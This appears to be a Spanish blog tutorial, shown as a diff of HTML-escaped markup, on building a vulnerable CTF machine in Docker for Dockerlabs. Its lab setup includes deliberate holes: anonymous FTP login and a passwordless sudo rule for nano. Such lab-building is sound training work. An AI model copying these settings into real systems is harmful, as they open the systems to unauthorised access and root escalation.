+&lt;pre&gt;&lt;code&gt;root@fc58d5436a68:/# apt update -y &amp;amp;&amp;amp; apt upgrade -y
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr /&gt;
+&lt;h2&gt;⚙️Configuración de servicios&lt;/h2&gt;
+&lt;h3&gt;📌Iniciar servicio OpenSSH&lt;/h3&gt;
+&lt;p&gt;Para instalar &lt;strong&gt;OpenSSH&lt;/strong&gt; tendremos que poner lo siguiente:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@fc58d5436a68:/# apt install ssh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Una vez ya tengamos &lt;strong&gt;ssh&lt;/strong&gt; instalado pondremos lo siguiente para iniciar el servicio:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@fc58d5436a68:/# service ssh start
+ * Starting OpenBSD Secure Shell server sshd               [ OK ]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Para confirmar podemos hacerle un escaneo nmap y ver si lo tiene abierto:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ nmap -p- --open -n -Pn -vvv 172.17.0.2
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-28 06:42 EDT
+Initiating ARP Ping Scan at 06:42
+Scanning 172.17.0.2 [1 port]
+Completed ARP Ping Scan at 06:42, 0.04s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 06:42
+Scanning 172.17.0.2 [65535 ports]
+Discovered open port 22/tcp on 172.17.0.2
+Completed SYN Stealth Scan at 06:42, 1.05s elapsed (65535 total ports)
+Nmap scan report for 172.17.0.2
+Host is up, received arp-response (0.0000070s latency).
+Scanned at 2024-07-28 06:42:07 EDT for 1s
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 64
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 1.25 seconds
+           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;📌Iniciar servicio FTP&lt;/h3&gt;
+&lt;p&gt;Para instalar FTP pondremos lo siguiente:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@fc58d5436a68:/# apt install vsftpd
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Una vez finalizada la instalación iniciaremos su servicio:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@fc58d5436a68:/# service vsftpd start
+ * Starting FTP server vsftpd               [ OK ]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;❯ nmap -p- --open -n -Pn -vvv 172.17.0.2
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-28 06:47 EDT
+Initiating ARP Ping Scan at 06:47
+Scanning 172.17.0.2 [1 port]
+Completed ARP Ping Scan at 06:47, 0.07s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 06:47
+Scanning 172.17.0.2 [65535 ports]
+Discovered open port 21/tcp on 172.17.0.2
+Completed SYN Stealth Scan at 06:47, 0.98s elapsed (65535 total ports)
+Nmap scan report for 172.17.0.2
+Host is up, received arp-response (0.0000070s latency).
+Scanned at 2024-07-28 06:47:51 EDT for 1s
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack ttl 64
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 1.19 seconds
+           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Si por ejemplo queremos hacer una máquina donde está habilitado el &lt;strong&gt;anonymous&lt;/strong&gt; tendremos que editar con &lt;strong&gt;nano&lt;/strong&gt; que tendremos que instalarlo nosotros porque en el contenedor &lt;em&gt;ubuntu&lt;/em&gt; no viene y con &lt;em&gt;nano&lt;/em&gt; editaremos el &lt;code&gt;/etc/vsftpd.conf&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;Instalamos nano:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;apt install nano
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Editamos el archivo &lt;strong&gt;vsftpd.conf&lt;/strong&gt; y buscaremos la linea que ponga:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# Allow anonymous FTP? (Disabled by default).
+anonymous_enable=NO
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Y cambiaremos el &lt;code&gt;anonymous_enable=NO&lt;/code&gt; por:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;anonymous_enable=YES
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Guardamos y reiniciamos el servicio:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@fc58d5436a68:/etc# service vsftpd restart
+ * Stopping FTP server                      [ OK ]
+ * Starting FTP server vsftpd               [ OK ]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora lanzaremos un nmap indicandole el script &lt;code&gt;ftp-anon&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ nmap -p21 --script=ftp-anon 172.17.0.2
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-28 06:54 EDT
+Nmap scan report for 172.17.0.2
+Host is up (0.000042s latency).
+
+PORT   STATE SERVICE
+21/tcp open  ftp
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;📌Iniciar servicio Apache2&lt;/h3&gt;
+&lt;p&gt;Para instalar &lt;strong&gt;Apache2&lt;/strong&gt; pondremos lo siguiente:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@fc58d5436a68:~# apt install apache2
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Una vez finalizada la instalación iniciaremos el servicio:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@fc58d5436a68:~# service apache2 start
+ * Starting Apache httpd web server apache2
+ AH00558: apache2: Could not reliably determine the server&apos;s fully qualified domain name, using 172.17.0.2. Set the &apos;ServerName&apos; directive globally to suppress this message*
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora si vamos a nuestro navegador y ponemos la &lt;strong&gt;IP&lt;/strong&gt; del contenedor podremos ver la plantilla predeterminada de &lt;strong&gt;Apache2&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Si queremos modificar la web tendremos que ir al &lt;code&gt;/var/www/html&lt;/code&gt; y ahi dentro podremos meter una &lt;a href=&quot;https://www.free-css.com/free-css-templates&quot;&gt;plantilla html&lt;/a&gt; o crear a mano la web:&lt;/p&gt;
+&lt;p&gt;En mi caso he modificado el &lt;code&gt;index.html&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;h1&amp;gt;Blog Pylon - Crea tu CTF en Docker&amp;lt;h1&amp;gt;
+&amp;lt;p&amp;gt;Espero que te este gustando!!&amp;lt;/p&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;📌Iniciar servicio Nginx&lt;/h3&gt;
+&lt;p&gt;Para instalar &lt;strong&gt;nginx&lt;/strong&gt; pondremos lo siguiente:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@fc58d5436a68:~# apt install nginx
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Una vez finalizada la instalación vamos a iniciar el servicio:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@fc58d5436a68:~# service nginx start
+ * Starting nginx nginx               [ OK ]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Para modificar o crear la web usa la misma ruta que &lt;strong&gt;Apache2&lt;/strong&gt; que es la &lt;code&gt;/var/www/html&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;📌Crear servicio personalizado&lt;/h3&gt;
+&lt;p&gt;Hay a veces donde nos puede pasar que necesitemos crear un servicio personalizado, por ejemplo para un producto que se inicie en local mediante un script y no un servicio como &lt;strong&gt;apache2,nginx,ftp,ssh...&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;La estructura de un servicio es así:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[Unit]
+Description=NombreServicio
+After=network.target
+
+[Service]
+ExecStart=/ruta/al/ejecutable
+WorkingDirectory=/ruta/al/directorio/del/ejecutable
+Restart=always
+User=usuario
+Group=grupo
+
+[Install]
+WantedBy=multi-user.target
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Vamos a crear un servicio personalizado que corra un servidor de &lt;strong&gt;python3&lt;/strong&gt; en el &lt;strong&gt;8080&lt;/strong&gt;, para ello primero instalaremos python3:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@fc58d5436a68:~# apt install python3
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Si hacemos un &lt;code&gt;python3 -m http.server 8080&lt;/code&gt; contemplaremos que se iniciara un servidor web por el 8080, así que lo tomaremos como de referencia. Para crear el servicio tendremos que ir a la siguiente ruta:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/etc/systemd/system
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Y ahí dentro crearemos un archivo con la extension &lt;code&gt;.service&lt;/code&gt;, y dentro de ese archivo meteremos la estructura que he hemos visto anteriormente:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@fc58d5436a68:/etc/systemd/system# cat personalizado.service
+[Unit]
+Description=NombreServicio
+After=network.target
+
+[Service]
+ExecStart=/ruta/al/ejecutable
+WorkingDirectory=/ruta/al/directorio/del/ejecutable
+Restart=always
+User=usuario
+Group=grupo
+
+[Install]
+WantedBy=multi-user.target
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora cambiare los valores de &lt;code&gt;Description&lt;/code&gt; &lt;code&gt;ExecStart&lt;/code&gt; y &lt;code&gt;WorkingDirectory&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[Unit]
+Description=serverpersonalizado
+After=network.target
+
+[Service]
+ExecStart=/usr/bin/python3 -m http.server 8080 -d /var/www/html/
+WorkingDirectory=/usr/bin/
+Restart=always
+User=root
+Group=root
+
+[Install]
+WantedBy=multi-user.target
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Con el &lt;code&gt;-d&lt;/code&gt; le indico el directorio, que en mi caso es el &lt;code&gt;/var/www/html&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Antes de iniciarlo instalaremos &lt;strong&gt;systemctl&lt;/strong&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@fc58d5436a68:/etc/systemd/system# apt install systemctl
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora haremos un &lt;code&gt;daemon-reload&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@fc58d5436a68:/etc/systemd/system# systemctl daemon-reload
+/usr/bin/systemctl:1541: SyntaxWarning: invalid escape sequence &apos;\w&apos;
+  expanded = re.sub(&quot;[$](\w+)&quot;, lambda m: get_env1(m), cmd.replace(&quot;\\\n&quot;,&quot;&quot;))
+/usr/bin/systemctl:1543: SyntaxWarning: invalid escape sequence &apos;\w&apos;
+  new_text = re.sub(&quot;[$][{](\w+)[}]&quot;, lambda m: get_env2(m), expanded)
+/usr/bin/systemctl:1628: SyntaxWarning: invalid escape sequence &apos;\w&apos;
+  cmd3 = re.sub(&quot;[$](\w+)&quot;, lambda m: get_env1(m), cmd2)
+/usr/bin/systemctl:1631: SyntaxWarning: invalid escape sequence &apos;\w&apos;
+  newcmd += [ re.sub(&quot;[$][{](\w+)[}]&quot;, lambda m: get_env2(m), part) ]
+ERROR:systemctl: dbus.service: Executable path is not absolute, ignoring: @/usr/bin/dbus-daemon @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Podremos ver que nos da varios errores pero podremos iniciar el servicio sin ningun problema.&lt;/p&gt;
+&lt;p&gt;Ahora iniciaremos el servicio:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@fc58d5436a68:/etc/systemd/system# systemctl start personalizado.service
+/usr/bin/systemctl:1541: SyntaxWarning: invalid escape sequence &apos;\w&apos;
+  expanded = re.sub(&quot;[$](\w+)&quot;, lambda m: get_env1(m), cmd.replace(&quot;\\\n&quot;,&quot;&quot;))
+/usr/bin/systemctl:1543: SyntaxWarning: invalid escape sequence &apos;\w&apos;
+  new_text = re.sub(&quot;[$][{](\w+)[}]&quot;, lambda m: get_env2(m), expanded)
+/usr/bin/systemctl:1628: SyntaxWarning: invalid escape sequence &apos;\w&apos;
+  cmd3 = re.sub(&quot;[$](\w+)&quot;, lambda m: get_env1(m), cmd2)
+/usr/bin/systemctl:1631: SyntaxWarning: invalid escape sequence &apos;\w&apos;
+  newcmd += [ re.sub(&quot;[$][{](\w+)[}]&quot;, lambda m: get_env2(m), part) ]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;❯ nmap -p- --open -n -Pn -vvv 172.17.0.2
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-28 07:32 EDT
+Initiating ARP Ping Scan at 07:32
+Scanning 172.17.0.2 [1 port]
+Completed ARP Ping Scan at 07:32, 0.05s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 07:32
+Scanning 172.17.0.2 [65535 ports]
+Discovered open port 8080/tcp on 172.17.0.2
+Completed SYN Stealth Scan at 07:32, 1.00s elapsed (65535 total ports)
+Nmap scan report for 172.17.0.2
+Host is up, received arp-response (0.0000070s latency).
+Scanned at 2024-07-28 07:32:16 EDT for 1s
+Not shown: 65534 closed tcp ports (reset)
+PORT     STATE SERVICE    REASON
+8080/tcp open  http-proxy syn-ack ttl 64
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 1.20 seconds
+           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Y podremos ver la web:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;⚙️Configuración de usuarios&lt;/h2&gt;
+&lt;h3&gt;📌Crear usuarios nuevos&lt;/h3&gt;
+&lt;p&gt;Para crear usuario nuevos podremos usar &lt;code&gt;adduser&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@fc58d5436a68:~# adduser usuarionuevo
+info: Adding user `usuarionuevo&apos; ...
+info: Selecting UID/GID from range 1000 to 59999 ...
+info: Adding new group `usuarionuevo&apos; (1001) ...
+info: Adding new user `usuarionuevo&apos; (1001) with group `usuarionuevo (1001)&apos; ...
+info: Creating home directory `/home/usuarionuevo&apos; ...
+info: Copying files from `/etc/skel&apos; ...
+New password:
+Retype new password:
+passwd: password updated successfully
+Changing the user information for usuarionuevo
+Enter the new value, or press ENTER for the default
+        Full Name []:
+        Room Number []:
+        Work Phone []:
+        Home Phone []:
+        Other []:
+Is the information correct? [Y/n]
+info: Adding new user `usuarionuevo&apos; to supplemental / extra groups `users&apos; ...
+info: Adding user `usuarionuevo&apos; to group `users&apos; ...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;📌Eliminar usuarios&lt;/h3&gt;
+&lt;p&gt;Para eliminar un usuario podremos usar &lt;code&gt;deluser&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@fc58d5436a68:~# deluser usuarionuevo
+
+info: Removing crontab ...
+info: Removing user `usuarionuevo&apos; ...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr /&gt;
+&lt;h2&gt;⚙️Configuración de permisos&lt;/h2&gt;
+&lt;h3&gt;📌Establecer permisos sudoers a usuarios&lt;/h3&gt;
+&lt;p&gt;Antes de todo tendremos que instalar &lt;code&gt;sudo&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@fc58d5436a68:~# apt install sudo
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Para establecer permisos &lt;code&gt;sudoers&lt;/code&gt; a un usuario tendremos que editar el &lt;code&gt;/etc/sudoers&lt;/code&gt; y bajaremos hasta la zona donde ponga:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# User privilege specification
+root    ALL=(ALL:ALL) ALL
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Para especificar un permiso sudo, tendremos que seguir la siguiente estructura:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;usuario  ALL=(usuario o root[ALL:ALL]) /ruta/del/binario/o/lo/que/sea
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Por ejemplo yo he creado un usuario llamado &lt;code&gt;sudoersuser&lt;/code&gt; que tenga la capacidad de usar &lt;code&gt;nano&lt;/code&gt; como root sin necesidad de su credencial:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# User privilege specification
+root    ALL=(ALL:ALL) ALL
+
+sudoersuser ALL=(root) NOPASSWD: /usr/bin/nano
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Si nos convertimos en el usuario y hacemos un &lt;code&gt;sudo -l&lt;/code&gt; podremos ver el permiso que le hemos especificado en el &lt;code&gt;/etc/sudoers&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudoersuser@fc58d5436a68:~$ sudo -l
+Matching Defaults entries for sudoersuser on fc58d5436a68:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User sudoersuser may run the following commands on fc58d5436a68:
+    (root) NOPASSWD: /usr/bin/nano
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr /&gt;
+&lt;h3&gt;📌Permisos en Apache2&lt;/h3&gt;
+&lt;p&gt;Cuando creamos una web en &lt;strong&gt;apache2&lt;/strong&gt; puede ocurrir de que los usuarios puedan acceder a la carpeta &lt;code&gt;images,js,db,etc...&lt;/code&gt;. Para impedir esto tendremos que crear un archivo &lt;code&gt;.conf&lt;/code&gt; en el directorio de &lt;code&gt;/etc/apache2/sites-enabled&lt;/code&gt;, en el veremos un archivo llamado &lt;code&gt;000-default.conf&lt;/code&gt;, lo editaremos y pondremos lo siguiente:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;Directory /var/www/html/images/&amp;gt;
+    Options FollowSymLinks
+    AllowOverride None
+    Require all granted
+&amp;lt;/Directory&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;VirtualHost *:80&amp;gt;
+        # The ServerName directive sets the request scheme, hostname and port that
+        # the server uses to identify itself. This is used when creating
+        # redirection URLs. In the context of virtual hosts, the ServerName
+        # specifies what hostname must appear in the request&apos;s Host: header to
+        # match this virtual host. For the default virtual host (this file) this
+        # value is not decisive as it is used as a last resort host regardless.
+        # However, you must set it for any further virtual host explicitly.
+        #ServerName www.example.com
+
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html
+
+&amp;lt;Directory /var/www/html/images/&amp;gt;
+    Options FollowSymLinks
+    AllowOverride None
+    Require all granted
+&amp;lt;/Directory&amp;gt;
+
+        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
+        # error, crit, alert, emerg.
+        # It is also possible to configure the loglevel for particular
+        # modules, e.g.
+        #LogLevel info ssl:warn
+
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+        # For most configuration files from conf-available/, which are
+        # enabled or disabled at a global level, it is possible to
+        # include a line for only one particular virtual host. For example the
+        # following line enables the CGI configuration for this host only
+        # after it has been globally disabled with &quot;a2disconf&quot;.
+        #Include conf-available/serve-cgi-bin.conf
+&amp;lt;/VirtualHost&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora guardaremos esos cambios y reiniciaremos el servicio &lt;em&gt;apache2&lt;/em&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@e5b9bcc4bcf6:/var/www/html/images# service apache2 restart
+ * Restarting Apache httpd web server apache2
+AH00558: apache2: Could not reliably determine the server&apos;s fully qualified domain name, using 172.17.0.2. Set the &apos;ServerName&apos; directive globally to suppress this message
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;img/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Y todo esto lo podemos configurar para diferentes carpetas:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;Directory /var/www/html/images/&amp;gt;
+    Options FollowSymLinks
+    AllowOverride None
+    Require all granted
+&amp;lt;/Directory&amp;gt;
+
+&amp;lt;Directory /var/www/html/css/&amp;gt;
+    Options FollowSymLinks
+    AllowOverride None
+    Require all granted
+&amp;lt;/Directory&amp;gt;
+
+&amp;lt;Directory /var/www/html/js/&amp;gt;
+    Options FollowSymLinks
+    AllowOverride None
+    Require all granted
+&amp;lt;/Directory&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr /&gt;
+&lt;h2&gt;⚙️ Configuración de Dockerfile&lt;/h2&gt;
+&lt;p&gt;Ya estamos casi por el final de nuestro CTF, ahora nos toca crear un &lt;strong&gt;Dockerfile&lt;/strong&gt; apuntando a una snapshot o directamente al contenedor docker de la siguiente manera:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;FROM snapshot1:latest
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora pondremos &lt;code&gt;CMD&lt;/code&gt; y le indicaremos ejecutar todos los servicios que tienen que estar activos cuando se despliege nuestro contenedor docker:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;FROM snapshot1:latest
+
+CMD service apache2 start &amp;amp;&amp;amp; tail -f /dev/null
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Veréis que al final de los servicios he puesto &lt;code&gt;tail -f /dev/null&lt;/code&gt; esto lo que hace es un bucle infinito apuntando al /dev/null, esto nos ayudara a cuando la persona inicie el contenedor docker los servicios no se apaguen y estén iniciados.&lt;/p&gt;
+&lt;h3&gt;📌 Exportar contenedor a .tar&lt;/h3&gt;
+&lt;p&gt;Esta es una de las partes más importantes si queremos publicar el CTF en la plataforma de &lt;a href=&quot;https://dockerlabs.es&quot;&gt;Dockerlabs&lt;/a&gt; que es que tendremos que construir una nueva imagen con el &lt;strong&gt;Dockerfile&lt;/strong&gt; que hemos creado con los parámetros indicados de iniciar los servicios necesarios, así que vamos a construir una imagen nueva desde el &lt;em&gt;Dockerfile&lt;/em&gt; llamada &lt;code&gt;miprimerctf&lt;/code&gt; claramente no es necesario poner ese nombre, vosotros poner el que más os guste para el CTF:&lt;/p&gt;
+&lt;p&gt;Emplearemos &lt;code&gt;docker build&lt;/code&gt; y el parametro &lt;code&gt;--tag&lt;/code&gt; para establecerle un nombre a la imagen:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ docker build --tag miprimerctf .
+Sending build context to Docker daemon  282.1kB
+Step 1/2 : FROM snapshot1:latest
+ ---&amp;gt; 8d230ff6c31a
+Step 2/2 : CMD service apache2 start &amp;amp;&amp;amp; tail -f /dev/null
+ ---&amp;gt; Running in a2c8c3cd1aba
+Removing intermediate container a2c8c3cd1aba
+ ---&amp;gt; d0ba19aba1c4
+Successfully built d0ba19aba1c4
+Successfully tagged miprimerctf:latest
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;El &lt;code&gt;.&lt;/code&gt; es que le estoy indicando que el archivo &lt;em&gt;Dockerfile&lt;/em&gt; se encuentra en el directorio actual donde estoy. Si hacemos un &lt;code&gt;docker images&lt;/code&gt; podremos ver la imagen que hemos construido con su respectivo nombre:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ docker images
+REPOSITORY    TAG       IMAGE ID       CREATED              SIZE
+miprimerctf   latest    d0ba19aba1c4   About a minute ago   226MB
+snapshot1     latest    8d230ff6c31a   10 minutes ago       226MB
+ubuntu        latest    35a88802559d   7 weeks ago          78.1MB
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora es cuando emplearemos &lt;code&gt;docker save&lt;/code&gt; para guardar la imagen en un &lt;strong&gt;.tar&lt;/strong&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ docker save -o miprimerctf.tar miprimerctf:latest
+❯ ls
+ Dockerfile  miprimerctf.tar
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Para comprobar de que todo funciona correcto vamos a descargarnos una maquina al azar de Dockerlabs y utilizaremos su &lt;code&gt;auto_deploy.sh&lt;/code&gt; a nuestro archivo &lt;code&gt;.tar&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ bash auto_deploy.sh miprimerctf.tar
+
+                            ##        .
+                      ## ## ##       ==
+                   ## ## ## ##      ===
+               /&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;\___/ ===
+          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
+               \______ o          __/
+                 \    \        __/
+                  \____\______/
+
+  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____
+  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__
+  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___]
+
+
+Se han detectado máquinas de DockerLabs previas, debemos limpiarlas para evitar problemas, espere un momento...
+Se han detectado máquinas de DockerLabs previas, debemos limpiarlas para evitar problemas, espere un momento...
+
+Estamos desplegando la máquina vulnerable, espere un momento.
+
+Máquina desplegada, su dirección IP es --&amp;gt; 172.17.0.3
+
+Presiona Ctrl+C cuando termines con la máquina para eliminarla
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora le haremos un escaneo nmap para ver si esta el puerto 80 abierto que es el que hemos establecido iniciando el servidor &lt;strong&gt;apache2&lt;/strong&gt; en el &lt;em&gt;Dockerfile&lt;/em&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ nmap -p- --open -n -Pn -vvv 172.17.0.3
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-28 10:15 EDT
+Initiating ARP Ping Scan at 10:15
+Scanning 172.17.0.3 [1 port]
+Completed ARP Ping Scan at 10:15, 0.06s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 10:15
+Scanning 172.17.0.3 [65535 ports]
+Discovered open port 80/tcp on 172.17.0.3
+Completed SYN Stealth Scan at 10:15, 1.11s elapsed (65535 total ports)
+Nmap scan report for 172.17.0.3
+Host is up, received arp-response (0.0000070s latency).
+Scanned at 2024-07-28 10:15:50 EDT for 1s
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack ttl 64
+MAC Address: 02:42:AC:11:00:03 (Unknown)
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 1.31 seconds
+           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr /&gt;
+&lt;h2&gt;📝 Creación del Writeup&lt;/h2&gt;
+&lt;p&gt;Ya habiendo comprobado que la máquina funciona bien y está todo correcto, nos toca lo último que es el writeup. Os comparto una estructura en &lt;strong&gt;PDF&lt;/strong&gt; de un writeup para Dockerlabs que es el que yo empleo:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://mega.nz/file/7cNzjJBL#74J4tjoHRF_URnduGxixoaB8MOrMnAE5eZQnLlwDoxY&quot;&gt;TemplateWriteupsDockerlabs&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;El template esta basado en el oficial de &lt;a href=&quot;https://github.com/hackthebox/writeup-templates&quot;&gt;HackTheBox&lt;/a&gt;.&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;👋 Despedida&lt;/h2&gt;
+&lt;p&gt;Espero que hayáis aprendido en como crear un CTF en Docker, tener en cuenta que ciertas cosas como los servicios se puede hacer en un Ubuntu Server y intentar crear una máquina para otra plataforma. Este es un blog que me ha parecido muy bueno crearlo para ayudar a la gente que quiere crear su CTF sin tener idea y obtenga cierta base con este blog. Adelanto que subiré un blog nuevo donde ensenaré como configuro una máquina desde el minuto 0 hasta que la tengo creada.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Att: Pylon&lt;/em&gt;&lt;/p&gt;
+&lt;hr /&gt;
